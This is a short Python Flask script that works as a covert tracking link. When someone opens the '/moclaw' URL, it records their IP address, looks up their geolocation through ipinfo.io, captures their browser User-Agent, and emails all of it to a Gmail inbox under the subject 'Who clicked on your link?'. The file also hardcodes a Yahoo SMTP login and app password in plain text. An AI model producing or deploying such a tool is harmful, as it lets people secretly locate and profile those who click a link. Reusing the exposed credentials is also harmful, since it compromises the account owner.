
from flask import Flask, jsonify, request
import requests
import json
import smtplib
from email.mime.text import MIMEText
app = Flask(__name__)


@app.route('/moclaw', methods=['Get'])
def add_device():
    ip = request.headers.get('X-Real-Ip', request.remote_addr)
    location = json.loads(requests.get(
        "http://ipinfo.io/{}/json".format(ip)).text)
    device = request.headers.get('User-Agent')
    send_mail(ip, location, device)
    return jsonify({'ip': ip, 'location': location, 'device': device})


def send_mail(ip, location, device):
    smtp_server = "smtp.mail.yahoo.com"
    smtp_port = 587
    smtp_username = "duta08042000@yahoo.com"
    smtp_password = "hwacrsibjdfzwdjh"

    # Email details
    sender_email = "duta08042000@yahoo.com"
    receiver_email = "moclaw210@gmail.com"
    subject = "Who clicked on your link?"
    message = "IP: {} \nLocation: {} \nDevice: {}".format(
        ip, location, device)

    # Create a MIME message
    msg = MIMEText(message)
    msg['Subject'] = subject
    msg['From'] = sender_email
    msg['To'] = receiver_email

    # Send the email
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(smtp_username, smtp_password)
    server.send_message(msg)
    server.quit()


if __name__ == '__main__':
    app.run(debug=True)
